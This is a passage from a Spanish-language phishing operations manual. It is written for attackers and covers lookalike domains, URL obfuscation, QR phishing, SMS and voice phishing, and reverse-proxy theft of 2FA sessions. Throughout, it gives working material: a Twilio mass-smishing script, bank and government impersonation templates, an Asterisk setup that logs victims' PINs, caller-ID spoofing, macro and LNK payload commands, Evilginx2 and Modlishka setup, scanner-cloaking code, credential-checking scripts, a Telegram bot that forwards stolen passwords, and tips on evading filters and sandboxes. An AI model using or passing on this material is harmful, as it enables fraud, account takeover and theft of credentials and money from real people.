#   - empresa.net (TLD diferente)
#   - empresa.co (código de país)
#   - ernpresa-ok.com (combinación)

# 2. Subdominios en dominios legítimos
# Si encontrás un subdominio olvidado:
#   - login.empresa.com.mx (a veces mal configurado)
#   - mail.empresa-antigua.com (dominio legacy)
#   - test.empresa.com (subdominio de test con DNS débil)

# 3. Open redirects de sitios legítimos
# Muchos sitios tienen redirects abiertos:
#   https://www.google.com/url?q=http://malicioso.com
#   https://l.facebook.com/l.php?u=http://malicioso.com
#   https://www.linkedin.com/safety/go?url=http://malicioso.com
# Podés usar la URL del sitio legítimo para redirigir al falso

# 4. URL shorteners (acortadores de URLs)
#   bit.ly, tinyurl.com, ow.ly, rebrandly
# Pero algunos proveedores bloquean URLs maliciosas

# 5. Link wrapping (los links de Gophish ya hacen tracking propio)
#   La URL de Gophish redirige a la landing page
#   Podés customizarla para que parezca legítima:
#   https://phishing.tudominio.com/c/XXXXXX

# 6. SPF bypass con mail forwarding
# Si el servidor destino acepta forwarding:
#   - Enviar desde un dominio con SPF bien configurado
#   - Ese dominio reenvía al target
#   - El SPF del dominio original es válido

# 7. DKIM bypass modificando headers
# Algunos servidores no validan DKIM si el email entra por puerto 25
# o si viene de ciertos IPs conocidos

# 8. Timing: enviar en horarios donde el equipo de seguridad no revisa
#   - Viernes a la tarde
#   - Findes de semana
#   - Feriados
#   - Durante la madrugada (según huso horario del target)
```

### 5.6 Chequeo de entregabilidad

```bash
# Verificar configuraciones DNS:
nslookup -type=txt _dmarc.tudominio.com
nslookup -type=txt default._domainkey.tudominio.com
nslookup -type=txt tudominio.com  # ver SPF

# Herramientas online:
# https://www.mail-tester.com → enviate un test y te da puntaje
# https://dkimvalidator.com  → verificar firma DKIM
# https://www.dmarcly.com/tools/dmarc-checker → DMARC

# Test SMTP manual:
openssl s_client -connect smtp.gmail.com:587 -starttls smtp
EHLO test.com
AUTH LOGIN
(base64 user)
(base64 pass)
MAIL FROM:<test@tudominio.com>
RCPT TO:<tuvictima@gmail.com>
DATA
Subject: Test
From: Test <test@tudominio.com>
To: Victima <tuvictima@gmail.com>

Este es un test.
.
QUIT
```

---

## 6. Email Warm-up y Reputación de Dominio

Los proveedores de email (Google, Microsoft, Yahoo) evalúan la reputación del dominio remitente. Un dominio nuevo o sin historial va directo a spam.

### 6.1 Estrategia de warm-up

```bash
# Semana 1-2: Temperatura ambiente
# - Enviar 5-10 emails por día a cuentas que controlás
# - Responder esos emails (importante: abrir, responder, marcar como "no spam")
# - Los emails deben ser reales: "Hola, ¿cómo estás?", no links

# Semana 3-4: Aumento gradual
# - 20-30 emails por día
# - Incluir links a tu dominio falso (que redirijan a sitios reales)
# - Monitorear entregabilidad con mail-tester.com
# - Idealmente tener las cuentas que respondan y hagan clic

# Semana 5-6: Volumen moderado
# - 50-100 emails por día
# - Ya podés incluir la landing page falsa

# Semana 7+: Volumen completo
# - 200+ emails por día
# - Tu dominio ya tiene reputación

# Herramientas de warm-up automático:
# 1. Mailwarm → https://mailwarm.io
# 2. Warmbox → https://warmbox.ai
# 3. Lemwarm → https://www.lemwarm.com
# 4. InboxReady → https://www.inboxready.com
```

### 6.2 Reputación de dominio

```bash
# Factores que afectan la reputación:
# 1. Edad del dominio → más viejo = mejor (>6 meses ideal)
# 2. Historial de envíos → nuevo dominio envía poco al principio
# 3. Bounce rate → menos de 3% de rebotes
# 4. Spam complaints → menos de 0.1%
# 5. Engagement → cuánto abren, responden, hacen clic
# 6. IP reputation → IP limpia (no en listas negras)
# 7. Configuración técnica → SPF/DKIM/DMARC correctos

# Verificar reputación:
# https://www.mxtoolbox.com/blacklists.aspx → listas negras
# https://www.dnschecker.org/ → ver registros DNS
# Google Postmaster Tools → https://postmaster.google.com
# Microsoft SNDS → https://sendersupport.olc.protection.outlook.com/snds/
```

---

## 7. URL Obfuscation — Cómo esconder la URL real

### 7.1 Redirectors

```bash
# Open redirect (redirección abierta en sitios legítimos)
# Vas a "Iniciar sesión con Google" y el redirect va a tu sitio
https://accounts.google.com/AccountChooser?continue=https://tusitiofalso.com/login

# Open redirect de Facebook
https://www.facebook.com/flx/warn/?hq=https://tusitiofalso.com

# Usar servicios legítimos como redirect:
# bit.ly → acortador
# tinyurl.com → acortador
# ow.ly → Hootsuite
# rebrandly → custom domains
```

### 7.2 URL encoding y ofuscación

```bash
# Diferentes formas de escribir la misma URL:
# 1. Hexadecimal
http://0xC0A80164  → 192.168.1.100

# 2. Octal
http://0300.0250.01.0144  → 192.168.1.100

# 3. Integer
http://3232235876  → 192.168.1.100

# 4. URL encoding
https://www.%66%61%63%65%62%6F%6F%6B.com  → facebook

# 5. Double encoding
https://www.facebook.com%2Flogin  → puede engañar parsers

# 6. Unicode homoglyphs (IDN homograph attack)
# Usar caracteres Unicode que se ven igual que ASCII
# facebook.com vs fаcebook.com (а = cyrillic)
# apple.com vs арple.com (а = cyrillic)
# Nota: navegadores modernos muestran el punycode
# Pero en clientes de correo viejos, puede funcionar

# 7. Subdominios infinitos
http://www.tudominio.com.target.com  → el dominio REAL es target.com
http://login.tudominio.com.real.com@malicioso.com  → el @ separa user:pass de host
```

### 7.3 QR Code [phishing](../raw/ph1sh1ng.md) (Quishing)

```bash
# Generar QR malicioso con SET (ver sección 2.6)
# O con herramientas online:
# qrencoder.net, qrstuff.com, the-qrcode-generator.com

# Técnicas:
# 1. Pegar QR codes en lugares públicos
#   - Carteles en la calle "Escaneá para ganar $5000"
#   - En baños de bares/restaurantes
#   - En estacionamientos "Pagar estacionamiento → escanear QR"
#   - En avisos de delivery "Seguí tu pedido"

# 2. Pegar stickers de QR sobre QR legítimos
#   - En locales: pegás tu QR sobre el QR de Mercado Pago
#   - En carteles de promociones reales

# 3. Enviar QR por email
#   - No se puede detectar tan fácil por los filtros antispam
#   - El usuario tiene que escanear con el celular
#   - En el celular es más difícil ver la URL real

# Convertir URL a QR con Python:
python3 -c "
import qrcode
qr = qrcode.QRCode(box_size=10, border=4)
qr.add_data('http://tusitiofalso.com/login')
qr.make(fit=True)
img = qr.make_image(fill_color='black', back_color='white')
img.save('phishing_qr.png')
"
```

---

## 8. [smishing](../raw/ph1sh1ng.md#smishing) (SMS [phishing](../raw/ph1sh1ng.md))

### 8.1 Plataformas de envío masivo

```bash
# === Servicios gratuitos (baja confiabilidad) ===
# 1. TextNow → https://www.textnow.com
#    - Números virtuales gratuitos, solo US/Canada
#    - API no oficial, usar con selenium/puppeteer

# 2. TextFree → https://www.textfree.us
#    - Similar a TextNow
#    - App mobile con números virtuales

# 3. Google Voice → https://voice.google.com
#    - Número gratuito con cuenta Google
#    - Envía SMS, límite diario

# === Servicios pagos (recomendados) ===
# 4. Twilio → https://www.twilio.com (el más usado)
#    Precios: ~$0.0079/SMS (US), ~$0.04/SMS (internacional)
#    API REST muy completa

# 5. AWS SNS → https://aws.amazon.com/sns/
#    Precios: ~$0.00645/SMS (US)
#    Integración con AWS ecosystem

# 6. Vonage (antes Nexmo)
#    Precios: ~$0.0050/SMS
#    API REST

# 7. Plivo → https://www.plivo.com
#    Precios: ~$0.0050/SMS
#    Buen soporte para Latinoamérica

# === SMPP Gateways (para alto volumen) ===
# 8. ClickSend
# 9. BulkSMS
# 10. RouteSMS (muy usado para smishing en LATAM)
```

### 8.2 Twilio smishing setup

```python
# Instalar: pip install twilio

from twilio.rest import Client

account_sid = 'ACXXXXXXXXXXXXXXXXX'
auth_token = 'your_auth_token'
client = Client(account_sid, auth_token)

# Enviar SMS masivo
targets = [
    '+541112345678',
    '+549112345679',
    '+541134567890',
]

for target in targets:
    try:
        message = client.messages.create(
            body='🔥 Promoción exclusiva: Ganaste $50,000! '
                 'Reclamá tu premio: https://bit.ly/3XXXXXX',
            from_='+12025551234',  # número Twilio comprado
            to=target
        )
        print(f'Enviado a {target}: SID {message.sid}')
    except Exception as e:
        print(f'Error con {target}: {e}')
```

### 8.3 Templates de smishing efectivos

```bash
# Bancarios (más rentables)
"🚨 Tu cuenta de [Banco] fue desactivada por actividad sospechosa.
Verificá tu identidad: https://bit.ly/falso-link"

"💳 Tu tarjeta [Banco] fue bloqueada por intento de compra
no reconocida. Reactivala: http://mifalso-banco.com/seguridad"

# Courier/Paquetes (muy usado en Argentina)
"📦 Tu paquete de [MercadoLibre/Amazon] está retenido en aduana.
Pagá el desaduanaje: http://correo-falso.com/pagar"

"🚚 No pudimos entregar tu pedido por datos incorrectos.
Actualizá tu dirección: https://bit.ly/falso"

# Streaming (bajo riesgo, alta tasa)
"🎬 Tu cuenta de Netflix se suspenderá en 24 horas.
Actualizá tu método de pago: http://netflix-verify.com"

"🎵 Spotify Premium gratis por 3 meses. 
Activá: http://spotify-promo-falso.com"

# Gubernamentales (ANSES/AFIP/ARCA para Argentina)
"💰 Tenés un pago pendiente de ANSES de $45,000.
Gestioná tu cobro: http://anses-falso.com/cobrar"

"⚠️ ARCA detectó inconsistencias en tu declaración de ingresos.
Regularizá: http://afip-falso.com/regularizar"
```

---

## 9. [vishing](../raw/ph1sh1ng.md#vishing) (Voice [phishing](../raw/ph1sh1ng.md))

### 9.1 Asterisk — Central telefónica VoIP

```bash
# Instalación de Asterisk en Kali/Ubuntu
sudo apt update && sudo apt install -y asterisk

# Configurar extensiones (/etc/asterisk/extensions.conf)
[default]
exten => _X.,1,Verbose(1, Llamada entrante de ${CALLERID(num)})
    same => n,Answer()
    same => n,Wait(1)
    same => n,Playback(mensaje-bienvenida)  # "Hola, somos el banco X"
    
    # Opción 1: hablar con agente
    same => n,Read(opcion,presione-1-para-hablar-con-soporte,1)
    same => n,GotoIf($["${opcion}" = "1"]?talk,1:next)
    
    # Opción 2: pedir datos automáticamente
    same => n(next),Read(numero,ingrese-su-numero-de-documento)
    same => n,Read(contra,ingrese-su-clave-de-4-digitos)
    
    # Guardar datos
    same => n,System(echo "${CALLERID(num)}:${numero}:${contra}" >> /var/log/phished.txt)
    
    # Transferir a un agente real
    same => n(talk),Dial(SIP/proveedor/${NUMERO_REAL})
    same => n,Hangup()

# Grabar mensajes de audio:
# Usando espeak (TTS robótico)
sudo apt install espeak
espeak -v spanish -w mensaje-bienvenida.wav "Hola, somos el departamento de seguridad de tu banco. Hemos detectado actividad sospechosa en tu cuenta."

# Con grabación real:
arecord -d 10 -f cd -t wav mensaje.wav  # grabar 10 segundos

# Spoofing de Caller ID en Asterisk:
# En /etc/asterisk/sip.conf o pjsip.conf
[general]
callerid = "Banco Nacional" <08009991234>

# Con Twilio (más fácil)
# Twilio permite setear el From a cualquier número (con verificación)
```

### 9.2 Twilio para vishing

```python
# pip install twilio
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse

account_sid = 'ACXXX'
auth_token = 'yyy'
client = Client(account_sid, auth_token)

# Crear aplicación TwiML (Twilio Markup Language)
response = VoiceResponse()
response.say('Hola, soy del departamento de seguridad de tu banco.',
             voice='alice', language='es-MX')
response.say('Hemos detectado un inicio de sesión sospechoso.',
             voice='alice', language='es-MX')
gather = response.gather(num_digits=4, action='/process',
                         method='POST')
gather.say('Por favor, ingresá los últimos 4 dígitos de tu tarjeta',
           voice='alice', language='es-MX')

# Hacer llamada
call = client.calls.create(
    url='http://tu-servidor.com/twiml.xml',
    to='+541112345678',  # víctima
    from_='+12025551234',  # tu número Twilio
    caller_id='01143215678'  # Caller ID spoofing (limitado)
)

print(f'Llamada iniciada: {call.sid}')
```

### 9.3 Deepfake voice para vishing

```bash
# Con ElevenLabs (https://elevenlabs.io)
# Clonar voz con 1 minuto de audio
# Usar API para TTS en tiempo real

# Con PlayHT (https://play.ht)
# Clonar voz y generar audio realista

# Con herramientas open source:
git clone https://github.com/CorentinJ/Real-Time-Voice-Cloning.git
cd Real-Time-Voice-Cloning
pip install -r requirements.txt
# Necesita: audio de 5+ segundos de la persona a clonar
# Genera: audio realista diciendo cualquier texto

# Uso en Asterisk:
# En vez de Playback con archivo WAV pregrabado,
# usar un script que llame a la AI en tiempo real
same => n,System(python3 /opt/deepfake-tts.py "${TEXTO}" /tmp/audio.wav)
same => n,Playback(/tmp/audio)
```

---

## 10. spear [phishing](../raw/ph1sh1ng.md#spear-phishing) Avanzado (Dirigido)

El [spear phishing](../raw/ph1sh1ng.md#spear-phishing) apunta a una persona específica con información personalizada.

### 10.1 [osint](../raw/0s1nt.md) previo — Investigación del target

```bash
# 1. LinkedIn → puesto, empresa, colegas, proyectos
# Buscar: nombre, empresa actual, habilidades, conexiones

# 2. Google dorks:
site:linkedin.com "Gerente IT" "Empresa S.A."
site:twitter.com "Empresa S.A." "@CEOempresa"
site:facebook.com "Empresa S.A." "trabajo"
site:github.com "empresa" "devops" "sysadmin"
site:pastebin.com "empresa.com"

# 3. theHarvester
theHarvester -d empresa.com -b linkedin,google,bing

# 4. Hunter.io → buscar emails por dominio
# https://hunter.io/search/empresa.com

# 5. Have I Been Pwned → ver filtraciones del email
# https://haveibeenpwned.com

# 6. DeHashed → buscar credenciales filtradas
# https://dehashed.com

# 7. Whois → información del dominio
whois empresa.com
```

### 10.2 Construcción del spear phish

```bash
# Ejemplo real:
# Target: Juan Pérez, Gerente IT en Empresa S.A.
# Colega: María López, trabaja en el mismo proyecto (SAP)

# Email:
# From: María López <maria.lopez@empresa.com>
# To: Juan Pérez <jperez@empresa.com>
# Subject: Backup urgente server SAP - 15/11

# Body:
# "Hola Juan,
# update urgente: necesito que valides el backup del server SAP
# antes de las 18hs porque mañana tenemos corte programado.
# Dejé el reporte en el share:
# http://phishing.empresa-verify.com/reporte-sap.html
# Cualquier cosa avisame.
# Saludos,
# María"

# Adjunto: reporte-sap.pdf (con macro maliciosa)
# o: link que apunta a una landing page clonada de Office 365

# ¿Por qué funciona?
# - María existe y trabaja con Juan
# - El tema (backup SAP) es relevante para su trabajo
# - Hay urgencia justificada (corte programado)
# - La URL usa un subdominio verosímil
```

### 10.3 Payloads para spear [phishing](../raw/ph1sh1ng.md)

```bash
# 1. Malicious Macro (Office)
# Usar un documento Word/Excel con macro que descarga payload
# Herramienta: macro_pack (https://github.com/sevagas/macro_pack)
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip install -r requirements.txt

# Generar macro que ejecuta PowerShell
python macro_pack.py -t DROPPER -o drop.doc \
  -p "powershell -e <BASE64_ENCODED_PAYLOAD>"

# 2. PDF malicioso
# Usar Adobe PDF con JavaScript embebido
# Herramienta: PDF Embedded Payload de SET

# 3. HTML Application (.hta)
# SET puede generar .hta que se ejecuta al abrir

# 4. LNK file (Shortcut malicioso)
# Crear acceso directo que apunta a EXE remoto
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\\Users\\Public\\Desktop\\Update.lnk")
$Shortcut.TargetPath = "powershell"
$Shortcut.Arguments = "-e BASE64PAYLOAD"
$Shortcut.Save()
```

---

## 11. [phishing](../raw/ph1sh1ng.md) Frameworks Comparación

| Framework | Lenguaje | UI | 2FA Capture | API | [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) | Evasión | Precio |
|-----------|----------|----|-------------|-----|-----|---------|--------|
| **[set](../raw/ph1sh1ng.md#social-engineering-toolkit)** | [python](../raw/pyth0n-f0r-h4ck1ng.md) | Terminal | Sí (básico) | No | Manual | Baja | Gratis |
| **[gophish](../raw/ph1sh1ng.md#gophish)** | Go | Web | No | Sí | Manual | Media | Gratis |
| **EvilGophish** | Go/Python | Web | Sí | Sí | Automático | Alta | Gratis |
| **PhishEye** | Python | Web | Sí | Sí | Manual | Alta | Gratis |
| **Modlishka** | Go | Terminal | Sí (reverse [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)) | No | Automático | Muy alta | Gratis |
| **Evilginx2** | Go | Terminal | Sí (reverse proxy) | No | Automático | Muy alta | Gratis |
| **Muraena** | Go | Terminal | Sí (reverse proxy) | No | Automático | Muy alta | Gratis |
| **CobalStrike** | Java/Go | Web | Sí | Sí | Automático | Muy alta | $$$ |
| **Phishing Frenzy** | Ruby | Web | No | Sí | Manual | Media | Gratis |
| **King Phisher** | Python | Web | Sí | Sí | Manual | Alta | Gratis |

---

## 12. Reverse [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) [phishing](../raw/ph1sh1ng.md) — Bypass de 2FA

El phishing tradicional captura user+pass pero no el OTP. Los reverse proxies capturan la sesión completa en tiempo real.

### 12.1 Cómo funciona

```
                   SESSION TOKEN
  Victima ──────────▶ Reverse Proxy ──────────▶ Servidor Real
        ◀──────────                ◀──────────
            Página real              Respuesta real
            (modificada)             (autenticada)

1. Víctima hace clic en link malicioso
2. Reverse proxy solicita la página real
3. Víctima ve la página real (no clonada)
4. Víctima pone credenciales → proxy las reenvía al servidor real
5. Servidor real pide 2FA → proxy lo reenvía a la víctima
6. Víctima pone OTP → proxy lo reenvía
7. Servidor real autentica la sesión
8. Proxy captura la cookie de sesión
9. Atacante usa la cookie para acceder como la víctima
```

### 12.2 Evilginx2

```bash
# Git clone
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Configurar
./evilginx -p

# Comandos internos:
config domain <tu-dominio.com>        # dominio falso
config ip <IP-del-servidor>            # tu IP
phishlets hostname o365 <login.tudominio.com>  # phishlet de Office 365
phishlets enable o365                   # habilitar phishlet

# Configurar DNS:
# login.tudominio.com → A record → tu IP
# www.tudominio.com → A record → tu IP
# ns1.tudominio.com → A record → tu IP
# ns2.tudominio.com → A record → tu IP

# Crear campaña
lures create o365
lures get-url 0  # obtener URL para enviar a la víctima

# Cuando la víctima se autentica:
# → Evilginx2 captura la cookie de sesión
# → Podés importarla a tu navegador con EditThisCookie
# → Tenés acceso completo a la cuenta de la víctima

# Phishlets disponibles (predefinidos):
# - o365 (Office 365)
# - google (Gmail/G Suite)
# - facebook
# - instagram
# - linkedin
# - twitter
# - github
# - dropbox
# + phishlets custom que podés escribir

# Escribir phishlet custom (.yaml):
name: "MiTarget"
author: "vos"
min_ver: "2.0.0"
proxy_hosts:
  - phish_sub: "login"
    orig_sub: "login"
    domain: "target.com"
    session: true
    is_landing: true
sub_filters:
  - host: "target.com"
    …
```

### 12.3 Modlishka

```bash
# Descargar
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka
go build -o modlishka

# Configurar (JSON)
cat config.json
{
    "proxyDomain": "phishing.tudominio.com",
    "listeningIP": "0.0.0.0",
    "targetDomain": "target.com",
    "targetResources": "",
    "terminateTriggers": [],
    "externalLog": "http://localhost:8080/log",
    "forceHTTP": false,
    "forceHTTPS": true,
    "dynamicMode": true,
    "debug": false,
    "log": "modlishka.log",
    "userAgents": "Mozilla/5.0",
    "trackingCookie": "m_token",
    "trackingParam": "m_id",
    "jsRules": [],
    "rules": [],
    "tls": {
        "enabled": true,
        "certPath": "/etc/letsencrypt/live/tudominio.com/fullchain.pem",
        "keyPath": "/etc/letsencrypt/live/tudominio.com/privkey.pem"
    }
}

# Ejecutar
./modlishka -config config.json

# Características:
# - Reverse proxy completo con SSL
# - Captura sesiones post-autenticación
# - Inyección de JavaScript tracking
# - Logging detallado
# - Modo dinámico (detecta recursos automáticamente)
```

### 12.4 Muraena + Necrobrowser (BITM)

Browser-in-the-Middle (BITM) es la técnica más avanzada. No solo es proxy — abre un [navegador](../raw/br0ws3r-3xpl01t4t10n.md) headless del lado del atacante.

```bash
git clone https://github.com/muraenateam/muraena.git
cd muraena
./muraena -config config.json

# Muraena configura un reverse proxy
# Necrobrowser (Chrome headless) renderiza del lado del atacante
# La víctima ve el contenido renderizado por el navegador del atacante
# Esto evita detección por JavaScript checks
```

---

## 13. Landing Page Cloaking — Evasión de Bots

Los servicios de seguridad (Proofpoint, Mimecast, etc.) escanean las URLs con bots. El cloaking les sirve contenido legítimo para que no te detecten.

### 13.1 Cloaking por [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)

```javascript
// JavaScript en la landing page
fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(data => {
        // Lista negra de IPs de seguridad
        const blocklist = [
            '104.16.0.0/12',   // Cloudflare (usado por scanners)
            '13.107.0.0/16',   // Microsoft safelinks
            '52.0.0.0/8',      // AWS (scanners)
            '35.0.0.0/8',      // Google Cloud
        ];
        
        const isBot = blocklist.some(range => ipInRange(data.ip, range));
        
        if (isBot || data.org?.includes('Google') || data.org?.includes('Amazon')) {
            // Redirigir a página legítima
            window.location = 'https://real-site.com';
        } else {
            // Mostrar landing falsa
            document.getElementById('login').style.display = 'block';
        }
    });
```

### 13.2 Cloaking por User-Agent

```javascript
// Server-side (PHP)
<?php
$bad_agents = [
    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot',
    'Baiduspider', 'YandexBot', 'Sogou', 'Exabot',
    'facebot', 'facebookexternalhit', 'Twitterbot',
    'PetalBot', 'SemrushBot', 'AhrefsBot', 'MJ12bot',
    'Screaming Frog', 'wget', 'curl', 'python-requests',
];

$ua = $_SERVER['HTTP_USER_AGENT'];
foreach ($bad_agents as $agent) {
    if (stripos($ua, $agent) !== false) {
        // Mostrar página real
        include 'real_page.html';
        exit;
    }
}

// User normal → mostrar phishing
include 'phishing_page.html';
?>
```

### 13.3 Cloaking por comportamiento

```javascript
// Detectar si hay mouse movement o scroll
let human = false;

document.addEventListener('mousemove', () => human = true);
document.addEventListener('scroll', () => human = true);
document.addEventListener('touchstart', () => human = true);

setTimeout(() => {
    if (!human) {
        // Probablemente un bot → redirigir
        window.location = 'https://real-site.com';
    }
}, 3000);  // esperar 3 segundos
```

### 13.4 Cloaking con Cloudflare Workers

```javascript
// Cloudflare Worker para cloaking
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const ua = request.headers.get('User-Agent') || '';
    const ip = request.headers.get('CF-Connecting-IP');
    const country = request.cf?.country;
    
    // Detectar scanners
    const botUA = /bot|crawl|spider|scrape|curl|wget|python-requests/i;
    const scannerRanges = ['104.16.0.0/12', '13.107.0.0/16'];
    
    if (botUA.test(ua) || scannerRanges.some(r => ipInRange(ip, r))) {
        // Servir página real desde el origen
        return fetch('https://real-site.com/login');
    }
    
    // Servir phishing
    return fetch('https://phishing-server.com/fake-login');
}
```

---

## 14. Post-[phishing](../raw/ph1sh1ng.md): Validación de Credenciales y Automatización

### 14.1 Validación automática de credenciales

```python
import requests
import json

def check_office365(email, password):
    """Verificar si credenciales de Office 365 son válidas"""
    session = requests.Session()
    
    # Obtener página de login
    r = session.get('https://login.microsoftonline.com/common/oauth2/authorize')
    
    # Enviar credenciales
    data = {
        'login': email,
        'passwd': password,
        'PPFT': extract_ppft(r.text),  # extraer token oculto
        'PPSX': 'Passwd',
        'type': 11,
    }
    
    r = session.post('https://login.microsoftonline.com/common/oauth2/authorize', data=data)
    
    if 'error' not in r.text and 'SesSig' in r.text:
        return True, "Válidas - Office 365"
    elif 'InvalidPasswordString' in r.text:
        return False, "Contraseña inválida"
    else:
        return None, "Requiere 2FA"

def check_google(email, password):
    """Verificar credenciales de Google"""
    session = requests.Session()
    
    # Paso 1
    r = session.get('https://accounts.google.com/ServiceLogin')
    
    # Paso 2: enviar email
    data = {'Email': email}
    r = session.post('https://accounts.google.com/_/signin/sl/lookup', data=data)
    
    # Paso 3: enviar password
    data = {'Passwd': password}
    r = session.post('https://accounts.google.com/_/signin/challenge/sl/password', data=data)
    
    if 'challenge' in r.text:
        return None, "Requiere 2FA"
    elif 'Signin' in r.text:
        return True, "Válidas"
    else:
        return False, "Credenciales inválidas"

# Validar credenciales capturadas
creds = [
    {'email': 'test@empresa.com', 'password': 'Passw0rd!'},
]

for cred in creds:
    result = check_office365(cred['email'], cred['password'])
    print(f"{cred['email']}: {result}")
```

### 14.2 Telegram Bot para alerts en tiempo real

```python
# bot.py — script para Gophish + Telegram
import requests
import time
import json

TELEGRAM_TOKEN = "TU_TOKEN"
CHAT_ID = "TU_CHAT_ID"
GOPHISH_API = "https://gophish-server:3333/api"
API_KEY = "TU_API_KEY"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    return requests.post(url, data=data)

def check_results():
    url = f"{GOPHISH_API}/results/?campaign_id=1"
    headers = {'Authorization': API_KEY}
    r = requests.get(url, headers=headers, verify=False)
    return r.json()

last_check = set()

while True:
    results = check_results()
    for r in results:
        if r['id'] not in last_check:
            last_check.add(r['id'])
            if r.get('password'):
                msg = f"""
🔴 <b>NUEVAS CREDENCIALES</b>
📧 Email: {r['email']}
🔑 Password: {r['password']}
🌐 IP: {r['ip']}
🕐 Time: {r['modified_date']}
📱 UA: {r['browser']}
"""
                send_telegram(msg)
    
    time.sleep(10)  # check cada 10 segundos
```

---

## 15. Detección de [phishing](../raw/ph1sh1ng.md) — Cómo evadir

### 15.1 Checklist de lo que los filtros revisan

```bash
# Filtros de email (Proofpoint, Mimecast, Office 365 ATP) revisan:
# 1. Reputación del remitente (IP, dominio, SPF/DKIM/DMARC)
# 2. Contenido del email (palabras clave: password, verify, urgent)
# 3. URLs (contra bases de datos de phishing conocidas)
# 4. Adjuntos (macros, PDFs con JS, .exe, .hta)
# 5. Headers del email (Received, Message-ID, Date)
# 6. Firma del remitente (vs firma real de la empresa)
# 7. Enlaces a dominios recién registrados (< 30 días)
# 8. Imágenes (código QR, screenshots con links)

# Cómo evadir:
# - Usar dominios con >6 meses de antigüedad
# - Configurar SPF/DKIM/DMARC correctamente
# - Evitar palabras disparadoras en asunto y cuerpo
# - No incluir adjuntos (usar links en su lugar)
# - Usar certificados SSL válidos (Let's Encrypt)
# - No usar dominios recién registrados
# - Timbrar el email para que parezca real (Reply-To, In-Reply-To)
```

### 15.2 Simulación de conversación

```bash
# Los filtros avanzados detectan emails "one-shot" (envío único)
# Mejor crear una cadena de emails:

# Email 1: "Hola Juan, ¿viste el reporte que te mandé?" (sin links)
# Email 2: Juan responde "No, ¿de qué reporte hablás?"
# Email 3: "El de la actualización de seguridad. Te lo reenvío: [LINK]"

# Esto parece una conversación real y evade detección heurística
```

### 15.3 Evasión de sandboxes

```bash
# Los sandboxes de seguridad abren links en entornos controlados
# Técnicas anti-sandbox en la landing page:

# 1. Time-based: si cargan demasiado rápido (< 1s), es un bot
if (performance.now() < 1000) {
    window.location = 'https://real-site.com';
}

# 2. Screen resolution: bots tienen resoluciones fijas
const screen = `${screen.width}x${screen.height}`;
const commonRes = ['800x600', '1024x768'];
if (commonRes.includes(screen)) {
    window.location = 'https://real-site.com';
}

# 3. No JavaScript: algunos sandboxes no ejecutan JS
<noscript>
    <meta http-equiv="refresh" content="0;url=https://real-site.com">
</noscript>

# 4. WebGL fingerprint: detectar GPU real vs emulada
# 5. Font detection: detectar fuentes del sistema
# 6. Chrome dev tools: detectar si están abiertas las herramientas
```

---

## 16. Recursos y Referencias

- **[set](../raw/ph1sh1ng.md#social-engineering-toolkit)**: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/trustedsec/social-engineer-toolkit
- **[gophish](../raw/ph1sh1ng.md#gophish)**: https://github.com/[gophish](../raw/ph1sh1ng.md#gophish)/[gophish](../raw/ph1sh1ng.md#gophish)
- **EvilGophish**: https://github.com/fin3ss3g0d/evilgophish
- **Evilginx2**: https://github.com/kgretzky/evilginx2
- **Modlishka**: https://github.com/drk1wi/Modlishka
- **Muraena**: https://github.com/muraenateam/muraena
- **PhishEye**: https://github.com/LukaSikic/PhishEye
- **GoPhish API Docs**: https://docs.getgophish.com/api/
- **[phishing](../raw/ph1sh1ng.md) Database**: https://github.com/mitchellkrogza/[phishing](../raw/ph1sh1ng.md).Database
- **CanIPhish**: https://www.caniphish.com (servicio de phishing como servicio)
- **Mail-tester**: https://www.mail-tester.com (verificar entregabilidad)
- **MXToolbox**: https://mxtoolbox.com (check de [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) y reputación)
- **Have I Been Pwned**: https://haveibeenpwned.com (ver si emails filtrados)

---

## 17. Setup Completo de Operación de [phishing](../raw/ph1sh1ng.md)

### 17.1 Obtención de VPS (Servidor Dedicado)

```bash
# Requisitos del VPS para phishing:
# - IP limpia (no en listas negras)
# - IPv4 + IPv6
# - Puertos 25, 587, 465, 80, 443 abiertos
# - Reverse DNS configurable (PTR record)
# - Mínimo 2GB RAM, 2 cores

# Proveedores recomendados (aceptan crypto):
# 1. Contabo (Alemania) - €5.99/mes - buen soporte, acepta crypto via CoinGate
# 2. BuyVM (Luxemburgo) - $3.50/mes - muy permisivos, IPs limpias
# 3. Hetzner (Alemania/Finlandia) - €4.15/mes - buen rendimiento
# 4. FranTech (USA/Luxemburgo) - $3/mes - sin verificación
# 5. IP Volume (Holanda) - $5/mes - IPs bulk, ideal para rotación

# Verificar reputación de IP antes de comprar
# https://mxtoolbox.com/blacklists.aspx
# https://www.spamhaus.org/lookup/
# https://talosintelligence.com/reputation_center

# Configurar Reverse DNS (PTR record)
# Contactar al proveedor para setear:
# mail.tudominio.com → IP_SERVIDOR

# Hardening inicial del VPS
sudo apt update && sudo apt upgrade -y
sudo ufw allow 22/tcp
sudo ufw allow 25/tcp
sudo ufw allow 587/tcp
sudo ufw allow 465/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# Crear usuario no-root
adduser phishop
usermod -aG sudo phishop
```

### 17.2 Registro de Dominio ([opsec](../raw/0ps3c-pr0.md))

```bash
# Selección de TLD para phishing:
# - .com: el más confiable, pero más caro
# - .co: parece legítimo, económico
# - .org: bueno para fingir ONGs
# - .io: popular para startups, bypassa algunos filtros
# - .xyz / .top / .club: muy baratos pero sospechosos
# - .online / .site: nuevos, buena tasa de entrega inicial
# - ccTLDs: .us, .uk, .de, .ca (dan confianza local)

